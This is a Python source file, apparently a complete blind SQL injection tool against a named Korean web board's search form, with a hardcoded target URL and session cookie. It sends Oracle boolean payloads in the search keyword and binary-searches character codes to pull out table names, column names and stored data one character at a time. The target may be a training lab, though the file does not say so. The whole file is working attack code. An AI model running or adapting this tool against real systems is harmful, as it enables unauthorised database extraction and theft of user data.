import requests
import pandas as pd
from colorama import init, Fore

url = "http://elms1.skinfosec.co.kr:8082/community6/free"
header = {
    "Content-Type" : "application/x-www-form-urlencoded"
}
cookies = { "JSESSIONID" : "8D668653DE53021B9A25A8974EF62746" }
data = {
    "searchType" : "all",
    "keyword" : "카카오톡%' and {} and 'a%'='a"
}

# 이진 탐색
def binarySearch(query):
    blindquery = "(" + query + ")" + " > {}"
    basedata_keyword = data["keyword"].format(blindquery)

    min = 1
    max = 127
    
    while min < max:
        avg = int((min + max) / 2)
        attackdata = {
            "searchType" : "all",
            "keyword" : basedata_keyword.format(avg)
        }

        res = requests.post(url=url, headers=header, cookies=cookies, data=attackdata)

        if '권한' in res.text:
            print("세션 ID가 만료되었습니다. 세션 ID를 교체해주세요!")
            min = 0
            break
        else:
            if '카카오를' in res.text:
                min = avg + 1
            else:
                max = avg

    return min

# 리스트 생성
#table_list = ['BOARD', 'COMM_FILE', 'COMM_MDI_FILE', 'MEMBER', 'ZIPCODE', 'ANSWER']
table_list = []
column_list = []
data_list = []


#아스키아트
def art():
    print("Welcome to elahack's blind-sql-injection!")
    init(autoreset=True)
    art = """
    =============================================================================================================
    ============================================================================================================= 
          _  _                   _ 
         | || |                 | |   
     ___ | || |__    __ _   ___ | | __
    / _ \| || '_ \  / _` | / __|| |/ /
   |  __/| || | | || (_| || (__ |   < 
    \___||_||_| |_| \__,_| \___||_|\_\    
     _      _  _             _                      _          _          _              _    _               
    | |    | |(_)           | |                    | |        (_)        (_)            | |  (_)              
    | |__  | | _  _ __    __| | ______  ___   __ _ | | ______  _  _ __    _   ___   ___ | |_  _   ___   _ __  
    | '_ \ | || || '_ \  / _` ||______|/ __| / _` || ||______|| || '_ \  | | / _ \ / __|| __|| | / _ \ | '_ \ 
    | |_) || || || | | || (_| |        \__ \| (_| || |        | || | | | | ||  __/| (__ | |_ | || (_) || | | |
    |_.__/ |_||_||_| |_| \__,_|        |___/ \__, ||_|        |_||_| |_| | | \___| \___| \__||_| \___/ |_| |_|
                                                | |                     _/ |                                  
                                                |_|                    |__/                                                                                                                     
    =============================================================================================================
    =============================================================================================================                   
    """
    print(Fore.RED + art)

# 테이블 가져오기
def getTable():

    query = "select count(table_name) from user_tables"
    countTable = binarySearch(query)
    if countTable == 0:
        return table_list

    print("테이블 개수: {}".format(countTable))

    # 각 테이블 이름 가져와서 리스트에 저장
    for i in range(1, countTable + 1):
        query = "select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(i)
        tableLength = binarySearch(query)
        
        table_name = ''
        for j in range(1, tableLength + 1):
            query = "select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(j, i)
            table_name += chr(binarySearch(query))

        print("{}번째 테이블 이름: {}".format(i, table_name))

        table_list.append(table_name)

    # 모든 테이블 이름을 표로 출력
    print("+------------+")
    print("|   테이블명  |")
    print("+------------+")
    for table_name in table_list:
        print("| {:^12} |".format(table_name))
    print("+------------+")

    return table_list

# 컬럼 가져오기
def getColumn(table_name):
    query = "select count(column_name) from user_tab_columns where table_name = '{}'".format(table_name)
    countColumn = binarySearch(query)
    print("{} 테이블의 컬럼 개수: {}".format(table_name, countColumn))

    for i in range(1, countColumn + 1):
        # 컬럼 이름 길이
        query = "select length(column_name) from (select column_name, rownum as rnum from user_tab_columns where table_name = '{}') where rnum = {}".format(table_name, i)
        columnLength = binarySearch(query)
        
        column_name = ''
        for j in range(1, columnLength + 1):
            # 컬럼 이름 한 글자씩 가져오기
            query = "select ascii(substr(column_name, {}, 1)) from (select column_name, rownum as rnum from user_tab_columns where table_name = '{}') where rnum = {}".format(j, table_name, i)
            column_name = column_name + chr(binarySearch(query))

        print("{} 테이블의 {}번째 컬럼 이름: {}".format(table_name, i, column_name))

        column_list.append(column_name)

    # 모든 컬럼 이름을 표로 출력
    print("+-----------+")
    print("|   컬럼명  |")
    print("+-----------+")
    for column_name in column_list:
        print("| {:^12} |".format(column_name))
    print("+-----------+")
    
    return column_list

# 데이터 가져오기
def getData(table_name, column_name):
    query = "select count({}) from {}".format(column_name ,table_name)
    countData = binarySearch(query)
    print("{} 테이블의 {} 컬럼 데이터 개수: {}".format(table_name, column_name, countData))
    for i in range(1, countData + 1):
        # 각 데이터의 길이
        query = "select length({}) from (select {}, rownum as rnum from {}) where rnum = {}".format(column_name, column_name, table_name, i)
        dataLength = binarySearch(query)
        
        data = ''
        for j in range(1, dataLength + 1):
            # 데이터를 한 글자씩 가져옴
            query = "select ascii(substr({}, {}, 1)) from (select {}, rownum as rnum from {}) where rnum = {}".format(column_name ,j, column_name, table_name, i)
            data = data + chr(binarySearch(query))

        print("{} 테이블의 {}번째 데이터: {}".format(table_name, i, data))

        data_list.append(data)

    # 모든 데이터를 표로 출력
    print("+-------------+")
    print("|   데이터명  |")
    print("+-------------+")
    for data_name in data_list:
        print("| {:^12} |".format(data_name))
    print("+-------------+")

def main():
    art()
    print("테이블 값을 받아오고 있습니다. 조금만 기다려 주세요...")
    getTable()
    print("table_list : {}".format(table_list))
    answer = input("인젝션 공격을 진행하시겠습니까? (y/n) : ")

    while answer != 'n':
        if answer not in('y' or 'n'):
            print("y 또는 n 으로 입력해주세요!")
            return answer
        elif(answer=='y'):
            print("========================================================")
            userTable = input("컬럼을 확인할 테이블 이름을 입력해주세요: ")
            if userTable in table_list:
                column_list = getColumn(userTable)
                print("========================================================")
                userColumn = input("데이터를 확인할 컬럼 이름을 입력해주세요: ")
                if userColumn in column_list:
                    getData(userTable, userColumn)
                    break
                else:
                    print("입력한 컬럼명이 리스트에 없습니다! 다시 입력해주세요")   

                break
            else:
                print("입력한 테이블명이 리스트에 없습니다! 다시 입력해주세요")

if __name__ == "__main__":
    main()

